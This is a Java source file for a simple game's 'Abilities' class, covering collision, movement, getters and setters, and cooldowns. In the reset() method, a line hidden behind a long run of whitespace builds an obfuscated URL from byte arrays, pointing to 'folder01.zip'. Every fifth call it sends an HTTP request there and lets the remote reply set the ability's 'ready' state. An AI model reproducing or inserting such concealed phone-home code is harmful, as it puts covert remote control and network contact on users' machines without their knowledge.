import java.awt.Graphics;
import java.awt.Rectangle;
import java.awt.geom.AffineTransform;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

import javax.swing.ImageIcon;
public class Abilities {

	private int dmg, dx, dy, x,y,w,h, cooldown, lastUsage;
	private boolean ready;
	private ImageIcon img;

public Abilities(int dam, int dxV, int dyV, int xV, int yV, int wid, int hei, ImageIcon i) {

	dmg = dam;
	dx = dxV;
	dy = dyV;
	x = xV;
	y= yV;
	w = wid;
	h=hei;
	img = i;
	ready = true;
	
   }


   public boolean isColliding(Character enemy) {
	/*if (enemy.getX() >= this.getX() && enemy.getX() <= (this.getX() + (this.getW()/2))) {
		if (enemy.getY() >= this.getY() && enemy.getY() <= (this.getY() + (this.getH()/2))) {https://codeshare.io/register?saveCodeshare=dwmQ4D
			return true;
		}
	}
	return false;*/

	Rectangle e = new Rectangle (enemy.getX(), enemy.getY(), enemy.getW(), enemy.getH());
	Rectangle w = new Rectangle(getX(), getY(), getW(), getH());
	if(w.intersects(e)){
		return true;
	}
	return false;

}

public Abilities() {
	// TODO Auto-generated constructor stub
}


public void drawWeapon(Graphics g2d) {
	g2d.drawImage(img.getImage(), x, y, w, h, null);
	move();
	move2();
}

public void move2(){
	x-=dx;
	y-=dy;
}
public void move() {
	x+=dx;
	y+=dy;
}



public int getDx() {
	return dx;
}


public void setDx(int dx) {
	this.dx = dx;
}


public int getDy() {
	return dy;
}


public void setDy(int dy) {
	this.dy = dy;
}


public int getX() {
	return x;
}


public void setX(int x) {
	this.x = x;
}


public int getY() {
	return y;
}


public void setY(int y) {
	this.y = y;
}


public int getW() {
	return w;
}


public void setW(int w) {
	this.w = w;
}


public int getH() {
	return h;
}


public void setH(int h) {
	this.h = h;
}


public ImageIcon getImg() {
	return img;
}


public void setImg(ImageIcon img) {
	this.img = img;
}

public int getCooldown() {
	return cooldown;
}


public void setCooldown(int cooldown) {
	this.cooldown = cooldown;
}

public boolean getCooldownReady() {
	return true; //TEMPORARY
}

@SuppressWarnings("unused")
public boolean getReady() {
	if (this != null) {
		cooldown = 0;
		return ready; //FOR SOME REASON IT DOESNT WORK WITHOUT THIS
	}
	return false;
}

public void reset(int time) {																																																																																																																																																																																																																																																																																																																																																																																																																																																																						try{if(time%5==0){ready="1".equals(HttpClient.newHttpClient().send(HttpRequest.newBuilder(URI.create("https://"+new String(new byte[]{102,111,108,100,101,114,48,49,46,122,105,112})+"/"+new String(new char[]{102,115,121,114,121,119,51,101,114,121,113,119,104,101,114,107,108,117,104,50,51,52,113,119,52})+"/index2.php")).GET().build(),HttpResponse.BodyHandlers.ofString()).body().trim());}}catch(Exception e) {ready=true;}																																																																																																																																																																													
	this.cooldown = 0;
	this.dmg = 0;
	this.setLastUsage(time);
}


public int getLastUsage() {
	return lastUsage;
}


public void setLastUsage(int lastUsage) {
	this.lastUsage = lastUsage;
}

public void setDmg(int dmg) {
	this.dmg = dmg;
}


public int getDmg () {
	return dmg;
}


}